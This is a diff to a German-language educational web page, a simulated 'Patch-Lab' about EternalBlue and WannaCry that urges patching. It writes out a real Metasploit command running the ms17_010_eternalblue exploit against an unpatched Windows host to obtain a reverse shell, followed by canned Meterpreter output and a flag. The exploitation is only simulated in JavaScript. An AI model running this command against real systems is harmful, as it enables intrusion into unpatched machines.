@@ -19,7 +19,7 @@
             padding: 20px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
         }
-        h1 {
+        h1, h2 {
             text-align: center;
             color: #007bff;
         }
@@ -62,15 +62,15 @@
     <div class="container">
         <h1>Patch-Lab: Blue und WannaCry</h1>
         <p>
-            Im Jahr 2017 wurde durch eine Schwachstelle im SMBv1-Protokoll ein Exploit namens <strong>EternalBlue</strong> bekannt. 
-            Dieser wurde von der Ransomware <strong>WannaCry</strong> ausgenutzt, um Millionen ungepatchter Systeme weltweit anzugreifen. 
-            Durch regelmäßige Sicherheitsupdates hätte dieser Angriff verhindert werden können.
+            Im Jahr 2017 führte die Sicherheitslücke <strong>EternalBlue</strong> im SMBv1-Protokoll (Server Message Block, ein Netzwerkprotokoll für Datei- und Druckerfreigaben) 
+            dazu, dass die Ransomware <strong>WannaCry</strong> weltweit ungepatchte Systeme angreifen konnte. Innerhalb weniger Stunden wurden Millionen Computer infiziert, 
+            Daten verschlüsselt und Lösegeldforderungen gestellt. Dies hätte durch regelmäßige Sicherheitsupdates verhindert werden können.
         </p>
 
         <h2>Schritt 1: Netzwerkscan mit Nmap</h2>
         <p>
-            Führe mit dem Befehl <code>nmap -sV [IP]</code> einen Netzwerkscan durch, um offene Ports und Dienste zu finden. 
-            Scanne beide IP-Adressen und finde heraus, welche angreifbar ist.
+            Führe einen Netzwerkscan durch, um herauszufinden, welche Geräte im Netzwerk erreichbar sind. Der Scan zeigt offene Ports (wie Port 445 für SMB) und das Betriebssystem an. 
+            Angreifbare Systeme haben ungepatchte Sicherheitslücken, die in einem späteren Schritt ausgenutzt werden können.
         </p>
         <pre>
 LHOST=192.168.1.100
@@ -86,44 +86,64 @@ RHOST2=192.168.1.20
         <div id="step-2" class="hidden">
             <h2>Schritt 2: Exploit vorbereiten</h2>
             <p>
-                Jetzt greifen wir das anfällige System mit einem Exploit an. Nutze den folgenden Befehl, um eine Verbindung zum Zielsystem herzustellen:
+                Jetzt greifen wir das anfällige System an. Hierfür nutzen wir den Exploit <strong>ms17_010_eternalblue</strong>, 
+                der die SMB-Sicherheitslücke ausnutzt. Gib den folgenden Befehl ein und ersetze <code>[RHOST]</code> mit der IP des angreifbaren Systems:
             </p>
             <pre>
-msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1.100; set RHOST [Angreifbares Ziel]; run"
+msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1.100; set RHOST [RHOST]; run"
             </pre>
-            <button class="btn" onclick="runExploit()">Exploit ausführen</button>
+            <div class="input-section">
+                <input type="text" id="exploit-command" placeholder="Befehl eingeben...">
+                <button class="btn" onclick="checkExploit()">Exploit ausführen</button>
+            </div>
             <div class="console" id="console-2"></div>
         </div>
 
         <div id="step-3" class="hidden">
             <h2>Schritt 3: Reverse Shell und Zugang</h2>
             <p>
-                Nach erfolgreichem Angriff haben wir Zugriff auf das System. Dies geschieht über eine sogenannte <strong>Reverse Shell</strong>, 
-                bei der sich das Zielsystem mit unserem angreifenden Computer verbindet. Dies ermöglicht es, Befehle auf dem Zielsystem auszuführen.
+                Nach erfolgreichem Angriff haben wir Zugriff auf das Zielsystem. Dies geschieht über eine sogenannte <strong>Reverse Shell</strong>, 
+                bei der sich das Zielsystem mit unserem Computer verbindet. So können wir Befehle ausführen, Dateien durchsuchen und sensible Informationen auslesen.
             </p>
             <div class="console">
-                <p>meterpreter > sysinfo</p>
-                <p>Computer Name: Victim-PC</p>
-                <p>OS: Windows 7 (Build 7601, Service Pack 1)</p>
-                <p>meterpreter > getuid</p>
-                <p>Server username: NT AUTHORITY\SYSTEM</p>
+                <p>meterpreter > ls</p>
+                <p> Directory of C:\Users\Victim\Desktop</p>
+                <p> flag.txt</p>
+                <p> confidential.docx</p>
+                <p>meterpreter > cd Desktop</p>
                 <p>meterpreter > cat flag.txt</p>
                 <p style="color: green;">Flag: {PATCH_THE_PATCH}</p>
             </div>
             <a href="index.html" class="btn">Zurück zum Hauptmenü</a>
         </div>
+
+        <h2>Ausblick: Keine Patches mehr für Windows 10?</h2>
+        <p>
+            Wenn Sicherheitsupdates für Windows 10 eingestellt werden, könnten ähnliche Szenarien auftreten wie bei WannaCry. 
+            Angreifer könnten ungepatchte Schwachstellen finden und ausnutzen. Besonders kritisch sind Protokolle wie SMB, die von vielen Geräten verwendet werden.
+            Um dies zu verhindern, sollten Systeme auf ein aktuelles Betriebssystem aktualisiert oder vom Internet getrennt werden, 
+            sobald der Support endet.
+        </p>
     </div>
 
     <script>
+        const scanResults = {};
+
         function scanIP(target) {
             const console1 = document.getElementById("console-1");
+            if (scanResults[target]) {
+                console1.innerHTML += `Scan für ${target} wurde bereits durchgeführt.\n`;
+                return;
+            }
+
             console1.innerHTML += `Starte Scan für ${target}...\n`;
             setTimeout(() => {
                 if (target === "RHOST1") {
-                    console1.innerHTML += "192.168.1.10 - Windows 10 (gepatcht, sicher)\n";
+                    console1.innerHTML += "192.168.1.10 - Windows 10 (gepatcht, sicher)\nOffene Ports: 80, 443, 3389\n";
                 } else if (target === "RHOST2") {
-                    console1.innerHTML += "192.168.1.20 - Windows 7 (ungepatcht, anfällig)\n";
+                    console1.innerHTML += "192.168.1.20 - Windows 7 (ungepatcht, anfällig)\nOffene Ports: 80, 445 (SMB), 3389\n";
                 }
+                scanResults[target] = true;
             }, 2000);
             setTimeout(() => {
                 if (target === "RHOST2") {
@@ -133,16 +153,23 @@ msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1
             }, 4000);
         }
 
-        function runExploit() {
+        function checkExploit() {
+            const input = document.getElementById("exploit-command").value.trim();
             const console2 = document.getElementById("console-2");
-            console2.innerHTML = "Starte Exploit...\n";
-            setTimeout(() => {
-                console2.innerHTML += "Exploit erfolgreich. Verbindung mit dem Ziel hergestellt.\n";
+            const expectedCommand = 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST 192.168.1.100; set RHOST 192.168.1.20; run"';
+
+            if (input === expectedCommand) {
+                console2.innerHTML = "Starte Exploit...\n";
                 setTimeout(() => {
-                    document.getElementById("step-2").classList.add("hidden");
-                    document.getElementById("step-3").classList.remove("hidden");
-                }, 2000);
-            }, 3000);
+                    console2.innerHTML += "Exploit erfolgreich. Verbindung mit dem Ziel hergestellt.\n";
+                    setTimeout(() => {
+                        document.getElementById("step-2").classList.add("hidden");
+                        document.getElementById("step-3").classList.remove("hidden");
+                    }, 2000);
+                }, 3000);
+            } else {
+                console2.innerHTML = "Ungültiger Befehl! Überprüfe die Syntax und versuche es erneut.";
+            }
         }
     </script>
 </body>
